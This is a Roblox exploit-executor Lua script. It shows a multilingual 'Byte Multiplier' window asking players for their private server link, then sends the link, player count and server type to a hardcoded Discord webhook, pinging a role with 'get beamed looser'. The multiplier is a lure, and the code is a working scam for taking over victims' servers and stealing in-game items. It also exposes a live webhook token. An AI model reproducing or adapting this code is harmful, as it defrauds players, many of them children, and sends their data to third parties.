-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- Webhook
local WEBHOOK_URL = "https://discord.com/api/webhooks/1421298911393480715/xuHNfecyEf0ZfXp5z7TOzMtqRA7zvcD7QRLXBbAiPtQ1cxyNLrcYqoYb6FtpghjP-img"

-- Image
local IMAGE_URL = "https://media.discordapp.net/attachments/1419518998638231622/1421324690034655344/TVMNUZZ8G89gF22hAAAAA.png?ex=68d89f45&is=68d74dc5&hm=bde254cec8bcd90b8bfccf2c94974db011c0ee2688d5ead7b11fbb6efdeabd70&=&format=webp&quality=lossless&width=236&height=162"

-- table return
local texts = {
    ["en"] = {
        title = "Byte Multiplier",
        placeholder = "Enter your private server link here",
        button = "Confirm",
        error = "Invalid link! Please enter a correct Roblox private server link.",
        valid = "valid link!"
    },
    ["es"] = {
        title = "Multiplicador de Bytes",
        placeholder = "Pon aquí el link de tu server privado",
        button = "Confirmar",
        error = "¡Link inválido! Ingresa un link válido de servidor privado.",
        valid = "¡Link válido!"
    },
    ["fr"] = {
        title = "Multiplicateur de Bytes",
        placeholder = "Entrez ici le lien de votre serveur privé",
        button = "Confirmer",
        error = "Lien invalide! Entrez un lien de serveur privé correct.",
        valid = "Lien valide!"
    }
}

-- Detect player language
local playerLanguage = Player.LocaleId:sub(1,2)
local uiText = texts[playerLanguage] or texts["en"]

-- SpawnScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = PlayerGui

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 250)
frame.Position = UDim2.new(0.5, -200, 0.5, -125)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
frame.BorderSizePixel = 0
frame.AnchorPoint = Vector2.new(0.5,0.5)
frame.Parent = screenGui

-- Corner
local uicorner = Instance.new("UICorner")
uicorner.CornerRadius = UDim.new(0, 20)
uicorner.Parent = frame

-- Stroke (Shadow)
local uistroke = Instance.new("UIStroke")
uistroke.Thickness = 2
uistroke.Color = Color3.fromRGB(80, 255, 255)
uistroke.Parent = frame

-- Futurist Gradient
local uigradient = Instance.new("UIGradient")
uigradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 50)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 30))
}
uigradient.Rotation = 45
uigradient.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 60)
title.Position = UDim2.new(0, 10, 0, 10)
title.Text = uiText.title
title.TextColor3 = Color3.fromRGB(0, 255, 255)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextScaled = true
title.Parent = frame

-- TextBox
local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0.9, 0, 0, 50)
textBox.Position = UDim2.new(0.05, 0, 0, 90)
textBox.PlaceholderText = uiText.placeholder
textBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
textBox.Text = ""
textBox.TextColor3 = Color3.fromRGB(0,0,0)
textBox.BackgroundColor3 = Color3.fromRGB(180, 180, 200)
textBox.Font = Enum.Font.Gotham
textBox.TextScaled = true
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local textCorner = Instance.new("UICorner")
textCorner.CornerRadius = UDim.new(0, 15)
textCorner.Parent = textBox

-- Validation Message In Real Time
local errorLabel = Instance.new("TextLabel")
errorLabel.Size = UDim2.new(0.9, 0, 0, 30)
errorLabel.Position = UDim2.new(0.05, 0, 0, 145)
errorLabel.Text = ""
errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
errorLabel.BackgroundTransparency = 1
errorLabel.Font = Enum.Font.GothamBold
errorLabel.TextScaled = true
errorLabel.TextWrapped = true
errorLabel.Parent = frame

-- Button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0.5, 0, 0, 50)
button.Position = UDim2.new(0.25, 0, 0, 180)
button.Text = uiText.button
button.TextColor3 = Color3.fromRGB(0, 255, 255)
button.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
button.Font = Enum.Font.GothamBold
button.TextScaled = true
button.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 20)
buttonCorner.Parent = button

local buttonStroke = Instance.new("UIStroke")
buttonStroke.Thickness = 2
buttonStroke.Color = Color3.fromRGB(0, 255, 255)
buttonStroke.Parent = button

-- Link Validation
local function isValidRobloxLink(link)
    local pattern = "^https://www.roblox.com/share%?code=[%da-fA-F]+&type=Server$"
    return string.match(link, pattern) ~= nil
end

-- Send Webhook
local function sendToDiscord(link)
    local description = ("[PS Link](%s)\n\nHighest Brainrots In Server:"):format(link)

    -- Players in server
    local playerCount = #Players:GetPlayers()

    -- Private or Public
    local serverType = playerCount >= 5 and "Public" or "Private"

    local payload = {
        content = "<@&1421324195085811733> get beamed looser",
        embeds = {{
            title = "Server Link Below:",
            description = description,
            color = 3447003,
            image = { url = IMAGE_URL },
            fields = {
                {
                    name = "Players in server",
                    value = tostring(playerCount),
                    inline = true
                },
                {
                    name = "Server Type",
                    value = serverType,
                    inline = true
                }
            }
        }}
    }

    local body = HttpService:JSONEncode(payload)

    local requestFunction = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)

    if not requestFunction then
        warn("Your Executor Does Not Support Https Requests")
        return
    end

    local success, result = pcall(function()
        if syn and syn.request then
            return syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body
            })
        else
            return requestFunction({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body
            })
        end
    end)

    if not success then
        warn("Error when sending petition:", result)
        return
    end

    local statusCode
    if type(result) == "table" then
        statusCode = result.StatusCode or result.statusCode or result.status
    end

    if statusCode == 200 or statusCode == 204 or statusCode == 201 then
        print("message successfully sent to a webhook LOL")
    else
        print("(status:", tostring(statusCode) .. ")")
    end
end
